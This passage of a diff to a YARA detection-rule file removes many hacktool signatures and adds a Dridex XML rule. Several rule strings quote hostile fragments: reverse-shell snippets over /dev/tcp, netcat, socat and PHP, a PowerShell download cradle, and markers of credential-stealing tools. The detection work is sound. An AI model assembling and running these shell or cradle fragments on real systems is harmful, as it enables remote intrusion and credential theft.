-      date = "17.11.14"
-      score = 60
-      hash = "69b105a3aec3234819868c1a913772c40c6b727a"
-      id = "b9693f51-26ac-5bf1-8c4d-ca852a154636"
-   strings:
-      $bat = "@echo off" fullword ascii
-      $s0 = "cs.exe %1" fullword ascii
-      $s2 = "nc %1 4444" fullword ascii
-   condition:
-      uint32(0) == 0x68636540 and $bat at 0 and all of ($s*)
-}
-
-rule UnPack_rar_Folder_InjectT {
-   meta:
-      description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      date = "23.11.14"
-      score = 60
-      hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
-      id = "cc7d1a36-1214-5a14-8589-9eb2339a8700"
-   strings:
-      $s0 = "%s -Install                          -->To Install The Service" fullword ascii
-      $s1 = "Explorer.exe" fullword ascii
-      $s2 = "%s -Start                            -->To Start The Service" fullword ascii
-      $s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
-      $s4 = "The Port Is Out Of Range" fullword ascii
-      $s7 = "Fail To Set The Port" fullword ascii
-      $s11 = "\\psapi.dll" ascii
-      $s20 = "TInject.Dll" fullword ascii
-
-      $x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
-      $x2 = "injectt.exe" fullword ascii
-   condition:
-      ( 1 of ($x*) ) and ( 3 of ($s*) )
-}
-
-rule QQ_zip_Folder_QQ {
-   meta:
-      description = "Disclosed hacktool set (old stuff) - file QQ.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      date = "23.11.14"
-      score = 60
-      hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
-      id = "30da6292-f670-5b73-985a-3028e20607be"
-   strings:
-      $s0 = "EMAIL:haoq@neusoft.com" fullword wide
-      $s1 = "EMAIL:haoq@neusoft.com" fullword wide
-      $s4 = "QQ2000b.exe" fullword wide
-      $s5 = "haoq@neusoft.com" fullword ascii
-      $s9 = "QQ2000b.exe" fullword ascii
-      $s10 = "\\qq2000b.exe" ascii
-      $s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
-      $s17 = "SOFTWARE\\HAOQIANG\\" ascii
-   condition:
-      5 of them
-}
-
-rule sig_238_sqlcmd {
-   meta:
-      description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      date = "23.11.14"
-      score = 40
-      hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
-      id = "0efdfac7-5a89-5251-b583-12b0a58c48ff"
-   strings:
-      $s0 = "Permission denial to EXEC command.:(" ascii
-      $s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
-      $s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
-      $s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
-      $s6 = "SqlCmd2.exe Inside Edition." fullword ascii
-      $s7 = "Http://www.patching.net  2000/12/14" fullword ascii
-      $s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
-   condition:
-      4 of them
-}
-
-rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
-   meta:
-      description = "Disclosed hacktool set (old stuff) - file Install.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      date = "23.11.14"
-      score = 60
-      hash = "95866e917f699ee74d4735300568640ea1a05afd"
-      id = "ebfc8e53-328c-5deb-bf9b-e0270f171c68"
-   strings:
-      $s1 = "http://go.163.com/sdemo" fullword wide
-      $s2 = "Player.tmp" fullword ascii
-      $s3 = "Player.EXE" fullword wide
-      $s4 = "mailto:sdemo@263.net" fullword ascii
-      $s5 = "S-Player.exe" fullword ascii
-      $s9 = "http://www.BaiXue.net (" wide
-   condition:
-      all of them
-}
-
-rule PSAttack_EXE {
-   meta:
-      description = "PSAttack - Powershell attack tool - file PSAttack.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/gdssecurity/PSAttack/releases/"
-      date = "2016-03-09"
-      modified = "2023-01-06"
-      score = 100
-      hash = "ad05d75640c850ee7eeee26422ba4f157be10a4e2d6dc6eaa19497d64cf23715"
-      id = "87f7956a-f607-5e14-a940-5080499cf682"
-   strings:
-      $x1 = "\\Release\\PSAttack.pdb"
-
-      $s1 = "set-executionpolicy bypass -Scope process -Force" fullword wide
-      $s2 = "PSAttack.Modules." ascii
-      $s3 = "PSAttack.PSAttackProcessing" fullword ascii
-      $s4 = "PSAttack.Modules.key.txt" fullword wide
-   condition:
-      ( uint16(0) == 0x5a4d and ( $x1 or 2 of ($s*) ) ) or 3 of them
-}
-
-rule Powershell_Attack_Scripts {
-   meta:
-      description = "Powershell Attack Scripts"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      date = "2016-03-09"
-      score = 70
-      id = "e8c4a672-229b-56c8-811b-071ae9ff341e"
-   strings:
-      $s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
-      $s2 = "Nishang\\Do-Exfiltration.ps1" ascii
-      $s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
-      $s4 = "Inveigh\\Inveigh.ps1" ascii
-   condition:
-      1 of them
-}
-
-rule PSAttack_ZIP {
-   meta:
-      description = "PSAttack - Powershell attack tool - file PSAttack.zip"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/gdssecurity/PSAttack/releases/"
-      date = "2016-03-09"
-      score = 100
-      hash = "3864f0d44f90404be0c571ceb6f95bbea6c527bbfb2ec4a2b4f7d92e982e15a2"
-      id = "4e064eb4-0b87-590c-9ee4-6764b982c006"
-   strings:
-      $s0 = "PSAttack.exe" fullword ascii
-   condition:
-      uint16(0) == 0x4b50 and all of them
-}
-
-rule dnscat2_Hacktool {
-   meta:
-      description = "Detects dnscat2 - from files dnscat, dnscat2.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://downloads.skullsecurity.org/dnscat2/"
-      date = "2016-05-15"
-      super_rule = 1
-      hash1 = "8bc8d6c735937c9c040cbbdcfc15f17720a7ecef202a19a7bf43e9e1c66fe66a"
-      hash2 = "4a882f013419695c8c0ac41d8a0fde1cf48172a89e342c504138bc6f1d13c7c8"
-      id = "23cca0fe-3e4e-5b91-8b53-933de8ff264a"
-   strings:
-      $s1 = "--exec -e <process>     Execute the given process and link it to the stream." fullword ascii
-      $s2 = "Sawlog" fullword ascii
-      $s3 = "COMMAND_EXEC [request] :: request_id: 0x%04x :: name: %s :: command: %s" fullword ascii
-      $s4 = "COMMAND_SHELL [request] :: request_id: 0x%04x :: name: %s" fullword ascii
-      $s5 = "[Tunnel %d] connection to %s:%d closed by the server!" fullword ascii
-   condition:
-      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 400KB and ( 2 of ($s*) ) ) or ( all of them )
-}
-
-rule WPR_loader_DLL {
-   meta:
-      description = "Windows Password Recovery - file loader64.dll"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2017-03-15"
-      hash1 = "7b074cb99d45fc258e0324759ee970467e0f325e5d72c0b046c4142edc6776f6"
-      hash2 = "a1f27f7fd0e03601a11b66d17cfacb202eacf34f94de3c4e9d9d39ea8d1a2612"
-      id = "d3102ab6-0473-544b-b9dd-ec7a18ae1c4b"
-   strings:
-      $x1 = "loader64.dll" fullword ascii
-      $x2 = "loader.dll" fullword ascii
-
-      $s1 = "TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==" fullword ascii /* base64 encoded string 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' */
-      $s2 = "UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50" fullword ascii /* base64 encoded string 'RemoteDesktopHelpAssistantAccount' */
-      $s3 = "U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz" fullword ascii /* base64 encoded string 'SamIRetrievePrimaryCredentials' */
-      $s4 = "VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk" fullword ascii /* base64 encoded string 'TS:InternetConnectorPswd' */
-      $s5 = "TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=" fullword ascii /* base64 encoded string 'L$UEActorAltCredPrivateKey' */
-      $s6 = "YXNwbmV0X1dQX1BBU1NXT1JE" fullword ascii /* base64 encoded string 'aspnet_WP_PASSWORD' */
-      $s7 = "TCRBTk1fQ1JFREVOVElBTFM=" fullword ascii /* base64 encoded string 'L$ANM_CREDENTIALS' */
-      $s8 = "RGVmYXVsdFBhc3N3b3Jk" fullword ascii /* base64 encoded string 'DefaultPassword' */
-
-      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } /* Opcode */
-      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } /* Opcode */
-      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } /* Opcode */
-   condition:
-      uint16(0) == 0x5a4d and
-      filesize < 400KB and
-      (
-         ( 1 of ($x*) and 1 of ($s*) ) or
-         ( 1 of ($s*) and all of ($op*) )
-      )
-}
-
-rule WPR_WindowsPasswordRecovery_EXE {
-   meta:
-      description = "Windows Password Recovery - file wpr.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2017-03-15"
-      hash1 = "c1c64cba5c8e14a1ab8e9dd28828d036581584e66ed111455d6b4737fb807783"
-      id = "7fa2062c-75dd-55aa-8775-631a9c1a497e"
-   strings:
-      $x1 = "UuPipe" fullword ascii
-      $x2 = "dbadllgl" fullword ascii
-      $x3 = "UkVHSVNUUlkgTU9O" fullword ascii /* base64 encoded string 'REGISTRY MON' */
-      $x4 = "RklMRSBNT05JVE9SIC0gU1l" fullword ascii /* base64 encoded string 'FILE MONITOR - SY' */
-
-      $s1 = "WPR.exe" fullword wide
-      $s2 = "Windows Password Recovery" fullword wide
-
-      $op0 = { 5f df 27 17 89 } /* Opcode */
-      $op1 = { 5f 00 00 f2 e5 cb 97 } /* Opcode */
-      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } /* Opcode */
-   condition:
-      uint16(0) == 0x5a4d and
-      filesize < 20000KB and
-      (
-         1 of ($x*) or
-         all of ($s*) or
-         all of ($op*)
-      )
-}
-
-rule Disclosed_0day_POCs_payload_MSI {
-   meta:
-      description = "Detects POC code from disclosed 0day hacktool set"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Disclosed 0day Repos"
-      date = "2017-07-07"
-      modified = "2022-12-21"
-      hash1 = "a7c498a95850e186b7749a96004a98598f45faac2de9b93354ac93e627508a87"
-      id = "fe32af56-d5a1-5246-a7df-395b9cd02faf"
-   strings:
-      $s1 = "WShell32.dll" fullword wide
-      $s2 = "Target empty, so account name translation begins on the local system." fullword wide
-      $s3 = "\\custact\\x86\\AICustAct.pdb" ascii
-   condition:
-      ( uint16(0) == 0xcfd0 and filesize < 1000KB and all of them )
-}
-
-rule Disclosed_0day_POCs_injector {
-   meta:
-      description = "Detects POC code from disclosed 0day hacktool set"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Disclosed 0day Repos"
-      date = "2017-07-07"
-      hash1 = "ba0e2119b2a6bad612e86662b643a404426a07444d476472a71452b7e9f94041"
-      id = "6de89a84-fe16-5064-8cbb-a3b9003f4c0c"
-   strings:
-      $x1 = "\\Release\\injector.pdb" ascii
-      $x2 = "Cannot write the shellcode in the process memory, error: " fullword ascii
-      $x3 = "/s shellcode_file PID: shellcode injection." fullword ascii
-      $x4 = "/d dll_file PID: dll injection via LoadLibrary()." fullword ascii
-      $x5 = "/s shellcode_file PID" fullword ascii
-      $x6 = "Shellcode copied in memory: OK" fullword ascii
-      $x7 = "Usage of the injector. " fullword ascii
-      $x8 = "KO: cannot obtain the SeDebug privilege." fullword ascii
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them
-}
-
-rule Disclosed_0day_POCs_shellcodegenerator {
-   meta:
-      description = "Detects POC code from disclosed 0day hacktool set"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Disclosed 0day Repos"
-      date = "2017-07-07"
-      hash1 = "55c4073bf8d38df7d392aebf9aed2304109d92229971ffac6e1c448986a87916"
-      id = "49250cbe-7bbd-5462-9324-1a8f350386f3"
-   strings:
-      $x1 = "\\Release\\shellcodegenerator.pdb" ascii
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
-}
-
-rule KeeTheft_EXE {
-   meta:
-      description = "Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/HarmJ0y/KeeThief"
-      date = "2017-08-29"
-      hash1 = "f06789c3e9fe93c165889799608e59dda6b10331b931601c2b5ae06ede41dc22"
-      id = "65531239-c5fa-5285-8f44-2d858e211c9b"
-   strings:
-      $x1 = "Error: Could not create a thread for the shellcode" fullword wide
-      $x2 = "Could not find address marker in shellcode" fullword wide
-      $x3 = "GenerateDecryptionShellCode" fullword ascii
-      $x4 = "KeePassLib.Keys.KcpPassword" fullword wide
-      $x5 = "************ Found a CompositeKey! **********" fullword wide
-      $x6 = "*** Interesting... there are multiple .NET runtimes loaded in KeePass" fullword wide
-      $x7 = "GetKcpPasswordInfo" fullword ascii
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
-}
-
-rule KeeTheft_Out_Shellcode {
-   meta:
-      description = "Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/HarmJ0y/KeeThief"
-      date = "2017-08-29"
-      hash1 = "2afb1c8c82363a0ae43cad9d448dd20bb7d2762aa5ed3672cd8e14dee568e16b"
-      id = "1263ad5d-5d50-50e6-ad78-9d5e4e16634b"
-   strings:
-      $x1 = "Write-Host \"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\"" fullword ascii
-      $x2 = "$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\.text\\W+CODE' })[0]" fullword ascii
-   condition:
-      ( filesize < 2KB and 1 of them )
-}
-
-rule Sharpire {
-   meta:
-      description = "Auto-generated rule - file Sharpire.exe"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/0xbadjuju/Sharpire"
-      date = "2017-09-23"
-      modified = "2022-12-21"
-      hash1 = "327a1dc2876cd9d7f6a5b3777373087296fc809d466e42861adcf09986c6e587"
-      id = "747f2798-4f93-5073-b358-969060a1c937"
-   strings:
-      $x1 = "\\obj\\Debug\\Sharpire.pdb" ascii
-      $x2 = "[*] Upload of $fileName successful" fullword wide
-
-      $s1 = "no shell command supplied" fullword wide
-      $s2 = "/login/process.php" fullword wide
-      $s3 = "invokeShellCommand" fullword ascii
-      $s4 = "..Command execution completed." fullword wide
-      $s5 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword wide
-      $s6 = "/admin/get.php" fullword wide
-      $s7 = "[!] Error in stopping job: " fullword wide
-   condition:
-      ( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) and 3 of them ) )
-}
-
-rule Invoke_Metasploit {
-   meta:
-      description = "Detects Invoke-Metasploit Payload"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1"
-      date = "2017-09-23"
-      hash1 = "b36d3ca7073741c8a48c578edaa6d3b6a8c3c4413e961a83ad08ad128b843e0b"
-      id = "40452884-df3f-5b49-ad10-05006cb115f2"
-   strings:
-      $s1 = "[*] Looks like we're 64bit, using regular powershell.exe" ascii wide
-      $s2 = "[*] Kicking off download cradle in a new process"
-      $s3 = "Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'"
-   condition:
-      ( filesize < 20KB and 1 of them )
-}
-
-rule PowerShell_Mal_HackTool_Gen {
-   meta:
-      description = "Detects PowerShell hack tool samples - generic PE loader"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "Internal Research"
-      date = "2017-11-02"
-      hash1 = "d442304ca839d75b34e30e49a8b9437b5ab60b74d85ba9005642632ce7038b32"
-      id = "d1fc4594-d816-5d02-bff6-3f220477b555"
-   strings:
-      $x1 = "$PEBytes32 = 'TVqQAAMAAAAEAAAA" wide
-      $x2 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword wide
-      $x3 = "@($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword wide
-      $x4 = "(Shellcode: LoadLibraryA.asm)" fullword wide
-   condition:
-      filesize < 8000KB and 1 of them
-}
-
-rule HKTL_shellpop_Netcat_UDP {
-   meta:
-      description = "Detects suspicious netcat popshell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "d823ad91b315c25893ce8627af285bcf4e161f9bbf7c070ee2565545084e88be"
-      id = "67aa53b6-00bc-5d2e-b6f3-37e9121cdd01"
-   strings:
-      $s1 = "mkfifo fifo ; nc.traditional -u" ascii
-      $s2 = "< fifo | { bash -i; } > fifo" fullword ascii
-   condition:
-      filesize < 1KB and 1 of them
-}
-
-rule HKTL_shellpop_socat {
-   meta:
-      description = "Detects suspicious socat popshell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "267f69858a5490efb236628260b275ad4bbfeebf4a83fab8776e333ca706a6a0"
-      id = "23c331ba-217c-5b17-b45e-d553eea76a56"
-   strings:
-      $s1 = "socat tcp-connect" ascii
-      $s2 = ",pty,stderr,setsid,sigint,sane" ascii
-   condition:
-      filesize < 1KB and 2 of them
-}
-
-rule HKTL_shellpop_Perl {
-   meta:
-      description = "Detects Shellpop Perl script"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb"
-      id = "d597d213-a70b-5412-adde-791b4d498848"
-   strings:
-      $ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
-      $ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
-   condition:
-      filesize < 2KB and 1 of them
-}
-
-rule HKTL_shellpop_Python {
-   meta:
-      description = "Detects malicious python shell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b"
-      id = "62fe0ae9-422e-5021-8a67-e88ff4bd2cf3"
-   strings:
-      $ = "os.putenv('HISTFILE', '/dev/null');" ascii
-   condition:
-      filesize < 2KB and 1 of them
-}
-
-rule HKTL_shellpop_PHP_TCP {
-   meta:
-      description = "Detects malicious PHP shell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "0412e1ab9c672abecb3979a401f67d35a4a830c65f34bdee3f87e87d060f0290"
-      id = "3bafc225-62e5-5183-84aa-9c3406b6c444"
-   strings:
-      $x1 = "php -r \"\\$sock=fsockopen" ascii
-      $x2 = ";exec('/bin/sh -i <&3 >&3 2>&3');\"" ascii
-   condition:
-      filesize < 3KB and all of them
-}
-
-rule HKTL_shellpop_Powershell_TCP {
-   meta:
-      description = "Detects malicious powershell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
-      id = "4f3a92db-f686-559a-9588-fb79f423c51f"
-   strings:
-      $ = "Something went wrong with execution of command on the target" ascii
-      $ = ";[byte[]]$bytes = 0..65535|%{0};$sendbytes =" ascii
-   condition:
-      filesize < 3KB and 1 of them
-}
-
-rule SUSP_Powershell_ShellCommand_May18_1 {
-   meta:
-      description = "Detects a supcicious powershell commandline"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
-      id = "efa81fd0-b764-5a1a-98a5-fc3135be220b"
-   strings:
-      $x1 = "powershell -nop -ep bypass -Command" ascii
-   condition:
-      filesize < 3KB and 1 of them
-
-}
-
-rule HKTL_shellpop_Telnet_TCP {
-   meta:
-      description = "Detects malicious telnet shell"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e"
-      id = "dbd5cc65-c6f1-54f3-813f-7a7f9bcca184"
-   strings:
-      $x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
-      $x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
-   condition:
-      filesize < 3KB and 1 of them
-}
-
-rule SUSP_shellpop_Bash {
-   meta:
-      description = "Detects susupicious bash command"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      modified = "2025-04-11"
-      score = 70
-      hash1 = "36fad575a8bc459d0c2e3ad626e97d5cf4f5f8bedc56b3cc27dd2f7d88ed889b"
-      id = "771b7d01-272a-5986-af07-7417b84c52ed"
-   strings:
-      $x1 = "bash -i >& /dev/tcp/" ascii
-      $x2 = "bash -i >& /dev/tcp/" ascii base64
-
-      $fp1 = "bash -i >& /dev/tcp/IP/PORT" ascii
-   condition:
-      1 of ($x*) and not 1 of ($fp*)
-}
-
-rule HKTL_shellpop_netcat {
-   meta:
-      description = "Detects suspcious netcat shellpop"
-      author = "Tobias Michalski"
-      reference = "https://github.com/0x00-0x00/ShellPop"
-      date = "2018-05-18"
-      hash1 = "98e3324f4c096bb1e5533114249a9e5c43c7913afa3070488b16d5b209e015ee"
-      id = "cd55e912-b57b-5fce-98eb-5a0cd27a6e4d"
-   strings:
-      $s1 = "if [ -e /tmp/f ]; then rm /tmp/f;"  ascii
-      $s2 = "fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" ascii
-      $s4 = "mknod /tmp/f p && nc" ascii
-      $s5 = "</tmp/f|/bin/bash 1>/tmp/f"  ascii
-    condition:
-      filesize < 2KB and 1 of them
-}
-
-rule HTKL_BlackBone_DriverInjector {
-   meta:
-      description = "Detects BlackBone Driver injector"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/DarthTon/Blackbone"
-      date = "2018-09-11"
-      score = 60
-      hash1 = "8062a4284c719412270614458150cb4abbdf77b2fc35f770ce9c45d10ccb1f4d"
-      hash2 = "2d2fc27200c22442ac03e2f454b6e1f90f2bbc17017f05b09f7824fac6beb14b"
-      hash3 = "e45da157483232d9c9c72f44b13fca2a0d268393044db00104cc1afe184ca8d1"
-      id = "0d992a6c-c57a-5895-af0d-9c167d922601"
-   strings:
-      $s1 = "=INITtH=PAGEtA" fullword ascii
-      $s2 = "BBInjectDll" fullword ascii
-      $s3 = "LdrLoadDll" fullword ascii
-      $s4 = "\\??\\pipe\\%ls" fullword wide
-      $s5 = "Failed to retrieve Kernel base address. Aborting" fullword ascii
-
-      $x2 = "BlackBone: %s: APC injection failed with status 0x%X" fullword ascii
-      $x3 = "BlackBone: PDE_BASE/PTE_BASE not found " fullword ascii
-      $x4 = "%s: Invalid injection type specified - %d" fullword ascii
-      $x6 = "Trying to map C:\\windows\\system32\\cmd.exe into current process" fullword wide
-      $x7 = "\\BlackBoneDrv\\bin\\" ascii
-      $x8 = "DosDevices\\BlackBone" wide
-   condition:
-      uint16(0) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ($x*) )
-}
-
-rule HKTL_SqlMap {
-   meta:
-      description = "Detects sqlmap hacktool"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/sqlmapproject/sqlmap"
-      date = "2018-10-09"
-      hash1 = "9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8"
-      id = "da2029dd-c4ce-557f-a409-c468fa3deef3"
-   strings:
-      $x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
-      $x2 = "if conf.get(\"dumper\"):" fullword ascii
-   condition:
-      filesize < 50KB and 1 of them
-}
-
-rule HKTL_Lazagne_Gen_18 {
-   meta:
-      description = "Detects Lazagne password extractor hacktool"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/AlessandroZ/LaZagne"
-      license = "https://creativecommons.org/licenses/by-nc/4.0/"
-      date = "2018-12-11"
-      score = 80
-      hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"
-      id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
-   strings:
-      $x1 = "lazagne.config.powershell_execute(" ascii
-      $x2 = "creddump7.win32." ascii
-      $x3 = "lazagne.softwares.windows.hashdump" ascii
-      $x4 = ".softwares.memory.libkeepass.common(" ascii
-   condition:
-      2 of them
-}
-
-rule HKTL_NoPowerShell {
-   meta:
-      description = "Detects NoPowerShell hack tool"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://github.com/bitsadmin/nopowershell"
-      date = "2018-12-28"
-      modified = "2022-12-21"
-      hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"
-      id = "17d508d5-833f-5232-a071-dbed8758493b"
-   strings:
-      $x1 = "\\NoPowerShell.pdb" ascii
-      $x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
-      $x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
-      $x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
-      $x5 = "NoPowerShell.exe" fullword wide
-   condition:
-      1 of them
-}
-
-rule HKTL_DomainPasswordSpray {
-   meta:
-      description = "Detects the Powershell password spray tool DomainPasswordSpray"
-      author = "Arnim Rupp"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      reference = "https://github.com/dafthack/DomainPasswordSpray"
-      date = "2023-01-13"
-      score = 60
-      hash1 = "44d4c0ae5673d2a076f3b5acdc83063aca49d58e6dd7cf73d0b927f83d359247"
-      id = "890e4514-2846-54f8-8f32-cc9d2a4ef81b"
-   strings:
-      $s = "Invoke-DomainPasswordSpray" fullword ascii wide
-   condition:
-      filesize < 100KB and
-      all of them
 }
 
 rule GetUserSPNs_VBS {
@@ -30514,6 +26840,30 @@ rule MAL_Backdoor_Naikon_APT_Sample1 {
       )
 }
 
+rule Dridex_Trojan_XML {
+	meta:
+		description = "Dridex Malware in XML Document"
+		author = "Florian Roth (Nextron Systems) @4nc4p"
+		reference = "https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503"
+		date = "2015/03/08"
+		hash1 = "88d98e18ed996986d26ce4149ae9b2faee0bc082"
+		hash2 = "3b2d59adadf5ff10829bb5c27961b22611676395"
+		hash3 = "e528671b1b32b3fa2134a088bfab1ba46b468514"
+		hash4 = "981369cd53c022b434ee6d380aa9884459b63350"
+		hash5 = "96e1e7383457293a9b8f2c75270b58da0e630bea"
+		id = "a8f3406c-f8b0-559f-be12-6b2a7d401ac2"
+	strings:
+		// can be ascii or wide formatted - therefore no restriction
+		$c_xml      = "<?xml version="
+		$c_word     = "<?mso-application progid=\"Word.Document\"?>"
+		$c_macro    = "w:macrosPresent=\"yes\""
+		$c_binary   = "<w:binData w:name="
+		$c_0_chars  = "<o:Characters>0</o:Characters>"
+		$c_1_line   = "<o:Lines>1</o:Lines>"
+	condition:
+		all of ($c*)
+}
+
 rule Casper_Included_Strings {
 	meta:
 		description = "Casper French Espionage Malware - String Match in File - http://goo.gl/VRJNLo"
@@ -30675,28 +27025,6 @@ rule SUSP_Reversed_Hacktool_Author : FILE {
    condition:
